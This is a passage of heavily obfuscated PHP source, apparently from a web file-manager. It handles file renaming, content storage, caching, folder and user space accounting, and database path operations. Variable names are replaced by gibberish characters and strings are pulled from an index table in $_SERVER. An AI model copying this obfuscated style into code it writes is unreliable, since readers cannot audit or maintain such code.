(!$£’¢Èáı) { return !1; } $‰©¥×¹š = $this->fileNameExist($£’¢Èáı[$Œíõ¢ûï[203]], $÷ø¼—ê); if ($‰©¥×¹š && $‰©¥×¹š != $úÙ’¤ÏÇ) { return !1; } $™„Áñ“¥ = array($Œíõ¢ûï[514] => $÷ø¼—ê, $Œíõ¢ûï[675] => USER_ID); if ($£’¢Èáı[$Œíõ¢ûï[505]] != $Œíõ¢ûï[101]) { $™„Áñ“¥[$Œíõ¢ûï[506]] = substr(get_path_ext($÷ø¼—ê), 0, 10); } Model($Œíõ¢ûï[657])->eventRename($úÙ’¤ÏÇ, $£’¢Èáı[$Œíõ¢ûï[32]], $÷ø¼—ê); $this->sourceCacheClear($úÙ’¤ÏÇ); $this->setNamePinyin($úÙ’¤ÏÇ, $™„Áñ“¥[$Œíõ¢ûï[32]], !1); $this->updateModifyTime($£’¢Èáı[$Œíõ¢ûï[203]]); $Áó”×‰¹ = $this->where(array($Œíõ¢ûï[511] => $úÙ’¤ÏÇ))->data($™„Áñ“¥)->save(); $“íæÌ = $Œíõ¢ûï[2350] . $£’¢Èáı[$Œíõ¢ûï[203]]; if (isset(self::$cacheChildList[$“íæÌ])) { unset(self::$cacheChildList[$“íæÌ]); } return $Áó”×‰¹; } public function setNamePinyin($Ø™½ğÌ, $ôõÃäÀü, $Î¤–ï½† = true) { $À§ŸåÊ‹ =& $_SERVER[¬ÏÕ§Áú]; $»·¬°© = Input::check($ôõÃäÀü, $À§ŸåÊ‹[679]); $çàˆÚ®í = array($À§ŸåÊ‹[536] => KodSort::makeStr($ôõÃäÀü)); if ($»·¬°©) { $çàˆÚ®í[$À§ŸåÊ‹[557]] = str_replace($À§ŸåÊ‹[53], $À§ŸåÊ‹[12], Pinyin::get($ôõÃäÀü)); $çàˆÚ®í[$À§ŸåÊ‹[556]] = Pinyin::get($ôõÃäÀü, $À§ŸåÊ‹[680]); } if (!$Î¤–ï½† && !$»·¬°©) { $çàˆÚ®í[$À§ŸåÊ‹[557]] = null; $çàˆÚ®í[$À§ŸåÊ‹[556]] = null; } $this->metaSet($Ø™½ğÌ, $çàˆÚ®í); } public function getContent($Ó¸Á—ñ½) { $®‰Ä°…Å =& $_SERVER[¬ÏÕ§Áú]; $•ßÙÈß© = $this->fileInfoGet($Ó¸Á—ñ½); if (!$•ßÙÈß©) { return !1; } if ($•ßÙÈß©[$®‰Ä°…Å[89]] == 0) { return $®‰Ä°…Å[12]; } $áš¨¦ó = $®‰Ä°…Å[2365] . $•ßÙÈß©[$®‰Ä°…Å[568]]; if ($•ßÙÈß©[$®‰Ä°…Å[89]] <= 1024 * 10) { $¾œ–Ãòˆ = Cache::get($áš¨¦ó); if (!$¾œ–Ãòˆ) { $¾œ–Ãòˆ = IO::getContent($•ßÙÈß©[$®‰Ä°…Å[97]]); Cache::set($áš¨¦ó, $¾œ–Ãòˆ); } return $¾œ–Ãòˆ; } if (!$•ßÙÈß©[$®‰Ä°…Å[97]]) { return $®‰Ä°…Å[12]; } return IO::getContent($•ßÙÈß©[$®‰Ä°…Å[97]]); } public function setDesc($È–ÌÛ„ö, $àŒáŠ›ş) { $Î¶Ò©Ø =& $_SERVER[¬ÏÕ§Áú]; Model($Î¶Ò©Ø[657])->eventAddDesc($È–ÌÛ„ö, $àŒáŠ›ş); return $this->metaSet($È–ÌÛ„ö, $Î¶Ò©Ø[545], $àŒáŠ›ş); } public function setContent($¸—¬Àë‚, $ãóóıÙ = '') { $Ş…åÈ¡’ =& $_SERVER[¬ÏÕ§Áú]; $Áë‹šÉÏ = $this->sourceInfo($¸—¬Àë‚); $üçâÊÑ = $this->fileInfoGet($¸—¬Àë‚); if (!$üçâÊÑ || !$Áë‹šÉÏ) { return !1; } $Š½æ°ãĞ = KodIO::ioFileDriverGet($Ş…åÈ¡’[503] . $¸—¬Àë‚ . $Ş…åÈ¡’[413]); $æ³­ÕØå = Model($Ş…åÈ¡’[565])->addFileByContent($ãóóıÙ, $Š½æ°ãĞ, $Áë‹šÉÏ[$Ş…åÈ¡’[32]]); if (!$æ³­ÕØå) { return !1; } $Îğ  éˆ = $this->fileHistory($Áë‹šÉÏ, $æ³­ÕØå[$Ş…åÈ¡’[562]], $æ³­ÕØå[$Ş…åÈ¡’[89]]); if (!$Îğ  éˆ) { return Model($Ş…åÈ¡’[565])->remove($æ³­ÕØå[$Ş…åÈ¡’[562]]); } $this->folderSizeReset($Áë‹šÉÏ[$Ş…åÈ¡’[203]]); return !0; } public function fileSubstr($ÇÌâ Ä´, $¿§Êº©†, $ ŞÌÔ‰¬) { $ğŞ¯«íğ = $this->fileInfoGet($ÇÌâ Ä´); if (!$ğŞ¯«íğ) { return !1; } return IO::fileSubstr($ğŞ¯«íğ[$_SERVER[¬ÏÕ§Áú][97]], $¿§Êº©†, $ ŞÌÔ‰¬); } public function fileInfoGet($ÏëŸ²Ãá) { $¨Ä·ı¹Ë =& $_SERVER[¬ÏÕ§Áú]; $äÂŸèÅ = $this->sourceInfo($ÏëŸ²Ãá); if (!$äÂŸèÅ || $äÂŸèÅ[$¨Ä·ı¹Ë[505]]) { return !1; } $ı¨»“É = $¨Ä·ı¹Ë[569] . $äÂŸèÅ[$¨Ä·ı¹Ë[562]]; $“”³ = _get(self::$cacheFileInfo, $ı¨»“É); if ($“”³) { return $“”³; } $İ½’¹­Í = Model($¨Ä·ı¹Ë[565])->fileInfo($äÂŸèÅ[$¨Ä·ı¹Ë[562]]); if ($İ½’¹­Í) { $İ½’¹­Í[$¨Ä·ı¹Ë[32]] = $äÂŸèÅ[$¨Ä·ı¹Ë[32]]; } self::$cacheFileInfo[$ı¨»“É] = $İ½’¹­Í; return $İ½’¹­Í; } private function folderChildrenNumber($Ø¨µ˜ªå) { $±‘Ø†İ =& $_SERVER[¬ÏÕ§Áú]; $ğ‰…ÇÄ– = $this->sourceInfo($Ø¨µ˜ªå); $é›Óø§ = array($±‘Ø†İ[676] => array($±‘Ø†İ[636], $ğ‰…ÇÄ–[$±‘Ø†İ[605]] . $Ø¨µ˜ªå . $±‘Ø†İ[637]), $±‘Ø†İ[673] => $ğ‰…ÇÄ–[$±‘Ø†İ[590]], $±‘Ø†İ[524] => intval($ğ‰…ÇÄ–[$±‘Ø†İ[525]]), $±‘Ø†İ[670] => 1); $ÀëÉÔÍ = $this->where($é›Óø§)->count(); $Â˜‚Õ¨¼ = $this->where($é›Óø§)->where(array($±‘Ø†İ[670] => 0))->count(); return array($±‘Ø†İ[93] => $Â˜‚Õ¨¼, $±‘Ø†İ[94] => $ÀëÉÔÍ); } public function pathInfo($öŸİãÏº, $‹„£¯©¡ = false) { $õ›ÀëÔŸ =& $_SERVER[¬ÏÕ§Áú]; $‹„£¯©¡ = !1; $öŸİãÏº = intval($öŸİãÏº); $¬ø‹–¡· = $õ›ÀëÔŸ[553] . intval($‹„£¯©¡) . $õ›ÀëÔŸ[482] . $öŸİãÏº; $ì§¦½Ø¯ = _get(self::$cachePathInfo, $¬ø‹–¡·); if ($ì§¦½Ø¯) { return $ì§¦½Ø¯; } $ÆªË¨õÜ = $this->sourceInfo($öŸİãÏº); if (!$ÆªË¨õÜ) { return !1; } $ÆªË¨õÜ = $this->_listDataApplyItem($ÆªË¨õÜ, $‹„£¯©¡); self::$cachePathInfo[$¬ø‹–¡·] = $ÆªË¨õÜ; return $ÆªË¨õÜ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Ê…í«›ä) { $¶¤­åæ =& $_SERVER[¬ÏÕ§Áú]; $¡´Í¦İŠ = _get(self::$cachePathInfoMore, $Ê…í«›ä); if ($¡´Í¦İŠ) { return $¡´Í¦İŠ; } $±°Äáš = $this->pathInfo($Ê…í«›ä); if (!$±°Äáš) { return !1; } if ($±°Äáš[$¶¤­åæ[505]] == $¶¤­åæ[101]) { $±°Äáš[$¶¤­åæ[92]] = $this->folderChildrenNumber($Ê…í«›ä); } self::$cachePathInfoMore[$Ê…í«›ä] = $±°Äáš; return $±°Äáš; } public function sourceInfo($†ÑˆÉöü) { $®‘²±Åº =& $_SERVER[¬ÏÕ§Áú]; if (!$†ÑˆÉöü) { return array(); } $†ÑˆÉöü = intval($†ÑˆÉöü); $õÍ›‚ğ´ = $®‘²±Åº[552] . $†ÑˆÉöü; $€¶“Ì„¬ = _get(self::$cacheSourceInfo, $õÍ›‚ğ´); if ($€¶“Ì„¬) { return $€¶“Ì„¬; } $™ÅÓÃŠ = $this->where(array($®‘²±Åº[204] => $†ÑˆÉöü))->find(); self::$cacheSourceInfo[$õÍ›‚ğ´] = $™ÅÓÃŠ; return self::$cacheSourceInfo[$õÍ›‚ğ´]; } public function sourceCacheClear($‘†²õäÛ = false) { self::cacheClear($‘†²õäÛ); } public static function cacheClear($½ûşŸ›£ = false) { $†ó«·¬× =& $_SERVER[¬ÏÕ§Áú]; if ($½ûşŸ›£ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$†ó«·¬×[552] . $½ûşŸ›£]); unset(self::$cachePathInfoMore[$½ûşŸ›£]); unset(self::$cachePathInfo[$†ó«·¬×[2366] . $½ûşŸ›£]); unset(self::$cachePathInfo[$†ó«·¬×[2367] . $½ûşŸ›£]); } public function metaSet($ë¥ØÌñÊ, $ĞîÄ€¯Ÿ = null, $•Òı¥ÜÄ = null) { $„¿ˆ”™ = parent::metaSet($ë¥ØÌñÊ, $ĞîÄ€¯Ÿ, $•Òı¥ÜÄ); if ($„¿ˆ”™) { $this->sourceCacheClear($ë¥ØÌñÊ); } return $„¿ˆ”™; } public function pathInfoByPath($Å¤°¶ğ, $³ÉöôÃç) { $æÍŒŞå± =& $_SERVER[¬ÏÕ§Áú]; $Åİİ°áò = !$³ÉöôÃç ? array() : explode($æÍŒŞå±[8], trim($³ÉöôÃç, $æÍŒŞå±[8])); $Õ‡×€… = intval($Å¤°¶ğ); foreach ($Åİİ°áò as $Ø”ŠÌÜ‡) { $˜Š´º¾¹ = array($æÍŒŞå±[203] => $Õ‡×€…, $æÍŒŞå±[32] => $Ø”ŠÌÜ‡); $ğŠ¯ÕŒÓ = $this->field($æÍŒŞå±[2368])->where($˜Š´º¾¹)->select(); if (!$ğŠ¯ÕŒÓ) { return !1; } $ğŠ¯ÕŒÓ = array_sort_by($ğŠ¯ÕŒÓ, $æÍŒŞå±[525]); $Õ‡×€… = intval($ğŠ¯ÕŒÓ[0][$æÍŒŞå±[204]]); } $æ©¦Ôñ• = $this->sourceInfo($Õ‡×€…); $this->pathInfoFilter($æ©¦Ôñ•); return $æ©¦Ôñ•; } protected function updateModifyTime($óŸ·ª±…) { $„ ùö½” =& $_SERVER[¬ÏÕ§Áú]; $ÃùÕ®®¢ = KodUser::id(); if (!$óŸ·ª±…) { return; } if (!is_array($óŸ·ª±…)) { $óŸ·ª±… = array($óŸ·ª±…); } foreach ($óŸ·ª±… as $¬×¦Ëæ => $ˆ•¬¬†) { $óŸ·ª±…[$¬×¦Ëæ] = intval($ˆ•¬¬†); $this->sourceCacheClear($ˆ•¬¬†); } $·•¬„™¼ = array($„ ùö½”[204] => array($„ ùö½”[7], $óŸ·ª±…)); $£®ü¦–‡ = array($„ ùö½”[675] => $ÃùÕ®®¢, $„ ùö½”[518] => time()); $this->where($·•¬„™¼)->save($£®ü¦–‡); } public function folderSizeReset($’ÌÀÌ·², $¹”øŞØ = false) { $å’àà¸ğ =& $_SERVER[¬ÏÕ§Áú]; if ($this->statusIgnoreResetSpace) { return; } if (!$’ÌÀÌ·²) { return; } $àğ…½¸ = $this->sourceInfo($’ÌÀÌ·²); $Œûºîûò = $å’àà¸ğ[2369] . $’ÌÀÌ·²; if (!$àğ…½¸ || !$àğ…½¸[$å’àà¸ğ[204]]) { return; } CacheLock::lock($Œûºîûò, 20); if ($¹”øŞØ === !1) { $this->sourceCacheClear($’ÌÀÌ·²); $àğ…½¸ = $this->sourceInfo($’ÌÀÌ·²); $ÏÎ…Ş = array($å’àà¸ğ[497] => $’ÌÀÌ·², $å’àà¸ğ[524] => 0); $¦ùÓµÑ = $this->where($ÏÎ…Ş)->sum($å’àà¸ğ[89]); $¹”øŞØ = intval($¦ùÓµÑ) - intval($àğ…½¸[$å’àà¸ğ[89]]); } if ($¹”øŞØ == 0) { return CacheLock::unlock($Œûºîûò); } $ø”Ö­Ìõ = $this->parentLevelArray($àğ…½¸[$å’àà¸ğ[605]]); if (!$ø”Ö­Ìõ) { $ø”Ö­Ìõ = array(); } $ø”Ö­Ìõ[] = $àğ…½¸[$å’àà¸ğ[204]]; $ÏÎ…Ş = array($å’àà¸ğ[204] => array($å’àà¸ğ[512], $ø”Ö­Ìõ)); if ($¹”øŞØ < 0) { $ÏÎ…Ş[$å’àà¸ğ[89]] = array($å’àà¸ğ[1140], abs($¹”øŞØ)); } $this->where($ÏÎ…Ş)->setAdd($å’àà¸ğ[89], $¹”øŞØ); CacheLock::unlock($Œûºîûò); if (!$àğ…½¸[$å’àà¸ğ[590]] || $àğ…½¸[$å’àà¸ğ[590]] == $å’àà¸ğ[241]) { return; } $ñ°Í­Ã„ = $å’àà¸ğ[2370] . $àğ…½¸[$å’àà¸ğ[201]] . $å’àà¸ğ[4] . $àğ…½¸[$å’àà¸ğ[590]]; $×™ıÇ = array($àğ…½¸[$å’àà¸ğ[201]], $àğ…½¸[$å’àà¸ğ[590]]); TaskRun::timeLimitCall($ñ°Í­Ã„, $å’àà¸ğ[2371], $×™ıÇ, 1.5); } public function folderSizeResetChildren($—­“•à) { $‘Ö¿çõş =& $_SERVER[¬ÏÕ§Áú]; $this->sourceCacheClear($—­“•à); $£è´î‘ş = $this->sourceInfo($—­“•à); if (!$£è´î‘ş) { return; } $ø˜‰ñóš = array($‘Ö¿çõş[670] => 1, $‘Ö¿çõş[673] => $£è´î‘ş[$‘Ö¿çõş[590]], $‘Ö¿çõş[676] => array($‘Ö¿çõş[636], $£è´î‘ş[$‘Ö¿çõş[605]] . $—­“•à . $‘Ö¿çõş[637])); $®¿ÎÌÎ‘ = $‘Ö¿çõş[2372]; $éä¸÷½š = $this->field($®¿ÎÌÎ‘)->where($ø˜‰ñóš)->select(); $ø˜‰ñóš[$‘Ö¿çõş[505]] = 0; $¹½÷óà = $this->field($®¿ÎÌÎ‘)->where($ø˜‰ñóš)->select(); if (!$¹½÷óà) { return; } $éä¸÷½š[] = $£è´î‘ş; $éä¸÷½š = array_to_keyvalue($éä¸÷½š, $‘Ö¿çõş[204]); foreach ($éä¸÷½š as $ıëÕ‡Õş => $‰Ï¬ÍæŸ) { $éä¸÷½š[$ıëÕ‡Õş][$‘Ö¿çõş[2373]] = $éä¸÷½š[$ıëÕ‡Õş][$‘Ö¿çõş[89]]; $éä¸÷½š[$ıëÕ‡Õş][$‘Ö¿çõş[89]] = 0; } foreach ($¹½÷óà as $‰Ï¬ÍæŸ) { $Â•üãô‡ = $‰Ï¬ÍæŸ[$‘Ö¿çõş[203]] . $‘Ö¿çõş[12]; if (!isset($éä¸÷½š[$Â•üãô‡])) { continue; } if ($‰Ï¬ÍæŸ[$‘Ö¿çõş[525]] == $éä¸÷½š[$Â•üãô‡][$‘Ö¿çõş[525]]) { $éä¸÷½š[$Â•üãô‡][$‘Ö¿çõş[89]] += $‰Ï¬ÍæŸ[$‘Ö¿çõş[89]]; } } foreach ($éä¸÷½š as $‰Ï¬ÍæŸ) { $ĞÍÚïõ = $this->parentLevelArray($‰Ï¬ÍæŸ[$‘Ö¿çõş[605]]); foreach ($ĞÍÚïõ as $Â•üãô‡) { $Â•üãô‡ = $Â•üãô‡ . $‘Ö¿çõş[12]; if (!isset($éä¸÷½š[$Â•üãô‡])) { continue; } if ($‰Ï¬ÍæŸ[$‘Ö¿çõş[525]] == $éä¸÷½š[$Â•üãô‡][$‘Ö¿çõş[525]]) { $éä¸÷½š[$Â•üãô‡][$‘Ö¿çõş[89]] += $‰Ï¬ÍæŸ[$‘Ö¿çõş[89]]; } } } $–ƒ§İœŒ = array(); foreach ($éä¸÷½š as $‰Ï¬ÍæŸ) { if ($‰Ï¬ÍæŸ[$‘Ö¿çõş[89]] == $‰Ï¬ÍæŸ[$‘Ö¿çõş[2373]]) { continue; } $–ƒ§İœŒ[] = array($‘Ö¿çõş[204], $‰Ï¬ÍæŸ[$‘Ö¿çõş[204]], $‘Ö¿çõş[89], $‰Ï¬ÍæŸ[$‘Ö¿çõş[89]]); } $this->saveAll($–ƒ§İœŒ); } public function userSpaceReset($¿ÄèÛÙ» = false) { $×°¢ù¯© =& $_SERVER[¬ÏÕ§Áú]; $³¨ı¶©¡ = $this->where(array($×°¢ù¯©[201] => self::TYPE_USER, $×°¢ù¯©[590] => $¿ÄèÛÙ», $×°¢ù¯©[505] => 0))->sum($×°¢ù¯©[89]); $³¨ı¶©¡ = !$³¨ı¶©¡ || $³¨ı¶©¡ <= 0 ? 0 : $³¨ı¶©¡; Model($×°¢ù¯©[598])->userEdit($¿ÄèÛÙ», array($×°¢ù¯©[2026] => $³¨ı¶©¡)); } public function targetSpaceUpdate($İ·Üø‚÷, $³œèü¦») { $“ıÑÂåµ =& $_SERVER[¬ÏÕ§Áú]; if (!$³œèü¦») { return; } if (!in_array($İ·Üø‚÷, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $”á¦¯ïò = $this->targetSpaceSize($İ·Üø‚÷, $³œèü¦»); if ($İ·Üø‚÷ == self::TYPE_USER) { Model($“ıÑÂåµ[598])->userEdit($³œèü¦», array($“ıÑÂåµ[2026] => $”á¦¯ïò)); } else { if ($İ·Üø‚÷ == self::TYPE_GROUP) { Model($“ıÑÂåµ[606])->groupEdit($³œèü¦», array($“ıÑÂåµ[2026] => $”á¦¯ïò)); } } } public function targetSpaceSize($è–¾¸ô, $° ø¡ˆ‰) { $°’û—²¦ =& $_SERVER[¬ÏÕ§Áú]; $•¯ªØø’ = 0; $­¢Û´øü = $this->targetSourceRoot($è–¾¸ô, $° ø¡ˆ‰, !0); foreach ($­¢Û´øü as $ÆòÚƒŞ¬) { if (!$ÆòÚƒŞ¬) { continue; } $•¯ªØø’ += floatval($ÆòÚƒŞ¬[$°’û—²¦[89]]); $Ç–ÍÑ = array($°’û—²¦[676] => array($°’û—²¦[636], $°’û—²¦[614] . $ÆòÚƒŞ¬[$°’û—²¦[204]] . $°’û—²¦[637])); $°ªÖ²ù = Model($°’û—²¦[523])->field($°’û—²¦[511])->where($Ç–ÍÑ)->select(); $°ªÖ²ù = array_to_keyvalue($°ªÖ²ù, $°’û—²¦[12], $°’û—²¦[204]); $°ªÖ²ù = array_unique(array_filter($°ªÖ²ù)); if ($°ªÖ²ù) { $Ç–ÍÑ = array($°’û—²¦[511] => array($°’û—²¦[512], $°ªÖ²ù)); $•¯ªØø’ += floatval($this->where($Ç–ÍÑ)->sum($°’û—²¦[89])); } } $•¯ªØø’ = !$•¯ªØø’ || $•¯ªØø’ <= 0 ? 0 : $•¯ªØø’; return $•¯ªØø’; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($·¾­Å¢Ï) { return $this->fileTypeProfile($·¾­Å¢Ï, SourceModel::TYPE_USER); } public function groupFileTypeProfile($½°ŸõâÅ) { return $this->fileTypeProfile($½°ŸõâÅ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($‹ÈĞôŞ¡, $´â‚Æšû) { $ˆ”ê­†Á =& $_SERVER[¬ÏÕ§Áú]; $’îå…‡ = $ˆ”ê­†Á[2374] . $‹ÈĞôŞ¡ . $ˆ”ê­†Á[11] . $´â‚Æšû; $¨›Èã²ç = Cache::get($’îå…‡); if ($¨›Èã²ç) { return $¨›Èã²ç; } $ô¡âÔò = array($ˆ”ê­†Á[670] => 0); if ($‹ÈĞôŞ¡ != !1) { $ô¡âÔò[$ˆ”ê­†Á[590]] = $‹ÈĞôŞ¡; $ô¡âÔò[$ˆ”ê­†Á[201]] = $´â‚Æšû; } $ğ–·Ú—­ = array(); $ğ–·Ú—­[$ˆ”ê­†Á[2375]] = array($ˆ”ê­†Á[2376] => LNG($ˆ”ê­†Á[2375]), $ˆ”ê­†Á[2377] => $this->where($ô¡âÔò)->count(), $ˆ”ê­†Á[641] => $this->where($ô¡âÔò)->sum($ˆ”ê­†Á[89])); $æ’ÙÑ² = KodIO::fileTypeList(); foreach ($æ’ÙÑ² as $‡ÇşŠùÆ => $ËÎŠÅÁ) { $ô¡âÔò[$ˆ”ê­†Á[506]] = $this->fileTypeWhere($‡ÇşŠùÆ); $ğ–·Ú—­[$‡ÇşŠùÆ] = array($ˆ”ê­†Á[2376] => $ËÎŠÅÁ[$ˆ”ê­†Á[32]], $ˆ”ê­†Á[2377] => $this->where($ô¡âÔò)->count(), $ˆ”ê­†Á[641] => $this->where($ô¡âÔò)->sum($ˆ”ê­†Á[89])); } Cache::set($’îå…‡, $ğ–·Ú—­, 1200); return $ğ–·Ú—­; } public function fileNameExist($ê´ÌÖó€, $ØšÀäÜ¢) { $Î¾š·×ä =& $_SERVER[¬ÏÕ§Áú]; $ª”Ü­±¢ = $this->field($Î¾š·×ä[2378])->where(array($Î¾š·×ä[203] => $ê´ÌÖó€, $Î¾š·×ä[32] => $ØšÀäÜ¢, $Î¾š·×ä[525] => 0))->find(); return is_array($ª”Ü­±¢) ? $ª”Ü­±¢[$Î¾š·×ä[204]] : !1; } public function childList($¸ËÔá”¾) { $åØâˆĞ =& $_SERVER[¬ÏÕ§Áú]; $úÉß‹® = $åØâˆĞ[2350] . $¸ËÔá”¾; if (isset(self::$cacheChildList[$úÉß‹®])) { return self::$cacheChildList[$úÉß‹®]; } $Ñ×»œ± = array($åØâˆĞ[203] => intval($¸ËÔá”¾), $åØâˆĞ[525] => 0); $ÂÁŸÛäá = $this->where($Ñ×»œ±)->select(); $ÂÁŸÛäá = $ÂÁŸÛäá ? $ÂÁŸÛäá : array(); self::$cacheChildList[$úÉß‹®] = $ÂÁŸÛäá; foreach ($ÂÁŸÛäá as $úÌ¢‡ÉŒ) { $úÉß‹® = $åØâˆĞ[552] . $úÌ¢‡ÉŒ[$åØâˆĞ[204]]; self::$cacheSourceInfo[$úÉß‹®] = $úÌ¢‡ÉŒ; } return $ÂÁŸÛäá; } public function fileNameAuto($¬è…­Ò, $ ‰ı˜ÂÎ, $­¡îË¸ = REPEAT_RENAME, $¡´¢Ùşœ = false) { $¿Ÿ–ÂĞ =& $_SERVER[¬ÏÕ§Áú]; $ÁÙª·÷º = get_path_ext($ ‰ı˜ÂÎ); $¬øÇ¥«³ = $ÁÙª·÷º ? get_path_ext_name($ ‰ı˜ÂÎ) . $¿Ÿ–ÂĞ[2379] . $ÁÙª·÷º : $ ‰ı˜ÂÎ . $¿Ÿ–ÂĞ[480]; $Á…èØå„ = array($¿Ÿ–ÂĞ[203] => $¬è…­Ò, $¿Ÿ–ÂĞ[525] => 0, $¿Ÿ–ÂĞ[32] => array($¿Ÿ–ÂĞ[479], $¬øÇ¥«³)); $ñÅĞ£ª = $this->field($¿Ÿ–ÂĞ[32])->where($Á…èØå„)->select(); $éºÂí¥´ = array_to_keyvalue($ñÅĞ£ª, $¿Ÿ–ÂĞ[12], $¿Ÿ–ÂĞ[32]); return $this->fileNameAutoGet($éºÂí¥´, $ ‰ı˜ÂÎ, $­¡îË¸, $¡´¢Ùşœ); } public function fileNameAutoGet($É‚­ÑÔª, $ú’Ò¡ÔÍ, $â×–èÔ, $áÒÖ³¶’) { $µˆô‰Ûğ =& $_SERVER[¬ÏÕ§Áú]; if ($â×–èÔ == REPEAT_REPLACE || !$É‚­ÑÔª || !in_array_not_case($ú’Ò¡ÔÍ, $É‚­ÑÔª) || $áÒÖ³¶’ && $â×–èÔ != REPEAT_RENAME_FOLDER) { return $ú’Ò¡ÔÍ; } if ($â×–èÔ == REPEAT_SKIP) { return !1; } $ºÄ·ÁËĞ = $µˆô‰Ûğ[10] . get_path_ext($ú’Ò¡ÔÍ); $ºÄ·ÁËĞ = $ºÄ·ÁËĞ == $µˆô‰Ûğ[10] || $áÒÖ³¶’ ? $µˆô‰Ûğ[12] : $ºÄ·ÁËĞ; for ($ñ±†±û = 1; $ñ±†±û <= count($É‚­ÑÔª) + 1; $ñ±†±û++) { $÷÷Èû³¤ = substr($ú’Ò¡ÔÍ, 0, strlen($ú’Ò¡ÔÍ) - strlen($ºÄ·ÁËĞ)); $‡ı²èñÈ = $÷÷Èû³¤ . "\50{$ñ±†±û}\x29{$ºÄ·ÁËĞ}"; if (!in_array_not_case($‡ı²èñÈ, $É‚­ÑÔª)) { return $‡ı²èñÈ; } } } } goto b˜Şí¥ë; E‹ÅğÏ˜Ğ‚: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($­µøÁ) { $this->pathParse = $­µøÁ; $this->model = Model($_SERVER[¬ÏÕ§Áú][1483]); } public function getPath($Ï‰®Ôç‹) { return trim($Ï‰®Ôç‹, $_SERVER[¬ÏÕ§Áú][8]); } public function pathFather($ú¤Èã¯÷) { $ı ığ³¡ = $this->parse($ú¤Èã¯÷); $ı ığ³¡ = $this->infoSimple($ú¤Èã¯÷); return $ı ığ³¡ ? $ı ığ³¡[$_SERVER[¬ÏÕ§Áú][203]] : !1; } public function pathThis($©¸¨«şÉ) { $•¤Ê´ÆŒ = $this->infoSimple($©¸¨«şÉ); return $•¤Ê´ÆŒ ? $•¤Ê´ÆŒ[$_SERVER[¬ÏÕ§Áú][32]] : !1; } public function getPathOuter($¥¡üÇôŞ) { if (!$¥¡üÇôŞ) { return $¥¡üÇôŞ; } $õÎª×Ê¬ = $this->parse($¥¡üÇôŞ); return KodIO::make($õÎª×Ê¬[$_SERVER[¬ÏÕ§Áú][492]]); } public function copyFolderFromIO($–ÄÁÉ¼, $İˆÚØ„, $è´ñÏ¶, $ú—ñÔÕ, $²Ÿöà£À) { $³öúÀŒØ = $this->model->copyFolderFromIO($–ÄÁÉ¼, $İˆÚØ„, $è´ñÏ¶, $ú—ñÔÕ, $²Ÿöà£À); return KodIO::make($³öúÀŒØ); } public function isParentOf($•³ï–Š, $Şµôş–©) { return $this->model->isParentOf($•³ï–Š, $Şµôş–©); } public function mkfile($úÓŠ—Ï†, $“¤’…Ó‘ = '', $«˜ñÚ = REPEAT_RENAME) { $£¯…”ÀŸ =& $_SERVER[¬ÏÕ§Áú]; $ëØêŸ³“ = $this->parse($úÓŠ—Ï†); $úÓŠ—Ï† = $ëØêŸ³“[$£¯…”ÀŸ[492]]; for ($®‡Ãºè¡ = 0; $®‡Ãºè¡ < count($ëØêŸ³“[$£¯…”ÀŸ[1484]]); $®‡Ãºè¡++) { $ÍÚæİûñ = $ëØêŸ³“[$£¯…”ÀŸ[1484]][$®‡Ãºè¡]; if ($®‡Ãºè¡ == count($ëØêŸ³“[$£¯…”ÀŸ[1484]]) - 1) { $úÓŠ—Ï† = $this->model->mkfile($úÓŠ—Ï†, $ÍÚæİûñ, $“¤’…Ó‘, $«˜ñÚ); break; } $úÓŠ—Ï† = $this->model->mkdir($úÓŠ—Ï†, $ÍÚæİûñ, REPEAT_SKIP); } return $this->getPathOuter($úÓŠ—Ï†); } public function mkdir($„‘ƒŠ–¢, $Ÿıµ†ëÄ = REPEAT_SKIP) { $äıÜ½Æ‡ =& $_SERVER[¬ÏÕ§Áú]; $ÀóÚ¦ñ· = $this->parse($„‘ƒŠ–¢); $„‘ƒŠ–¢ = $ÀóÚ¦ñ·[$äıÜ½Æ‡[492]]; for ($øŠ‹Ş±£ = 0; $øŠ‹Ş±£ < count($ÀóÚ¦ñ·[$äıÜ½Æ‡[1484]]); $øŠ‹Ş±£++) { $Áôı˜˜’ = $ÀóÚ¦ñ·[$äıÜ½Æ‡[1484]][$øŠ‹Ş±£]; $„‘ƒŠ–¢ = $this->model->mkdir($„‘ƒŠ–¢, $Áôı˜˜’, $Ÿıµ†ëÄ); } return $this->getPathOuter($„‘ƒŠ–¢); } public function copyFile($ëÒèœ–Ä, $÷ŒÌô¢, $„“®—î³ = REPEAT_REPLACE) { $½„Äè›¶ =& $_SERVER[¬ÏÕ§Áú]; $Îô´É’° = $this->parse($÷ŒÌô¢); $Ôù ­…… = $this->model->copy($ëÒèœ–Ä, $Îô´É’°[$½„Äè›¶[492]], $„“®—î³, $Îô´É’°[$½„Äè›¶[97]]); return $Ôù ­…… ? $this->getPathOuter($Ôù ­……) : !1; } public function moveFile($Ë¸û¼ºØ, $ıŠ©—, $â×¬ĞşŸ = REPEAT_REPLACE) { $ö‚ó“Äª =& $_SERVER[¬ÏÕ§Áú]; $¦Èª±ªü = $this->parse($ıŠ©—); $í¢´ŞÒÓ = $this->model->move($Ë¸û¼ºØ, $¦Èª±ªü[$ö‚ó“Äª[492]], $â×¬ĞşŸ, $¦Èª±ªü[$ö‚ó“Äª[97]]); return $í¢´ŞÒÓ ? $this->getPathOuter($í¢´ŞÒÓ) : !1; } public function copy($ğàõŞÏ, $¬Ï°£×¸, $€Ü›˜ŸÙ = REPEAT_REPLACE, $¤Ç¨ÎëÔ = false) { $¼à™¸½á = $this->parse($¬Ï°£×¸); $æ¨å›¾ = $this->model->copy($ğàõŞÏ, $¼à™¸½á[$_SERVER[¬ÏÕ§Áú][492]], $€Ü›˜ŸÙ, $¤Ç¨ÎëÔ); return $æ¨å›¾ ? $this->getPathOuter($æ¨å›¾) : !1; } public function moveSameAllow() { } public function move($™ã¼“È, $ãıÃÒÓ•, $»ö™ïÂè = REPEAT_REPLACE, $İ‡É×éÎ = false) { $ĞËÒÒ²Ã = $this->parse($ãıÃÒÓ•); $úÓÌé¨² = $this->model->move($™ã¼“È, 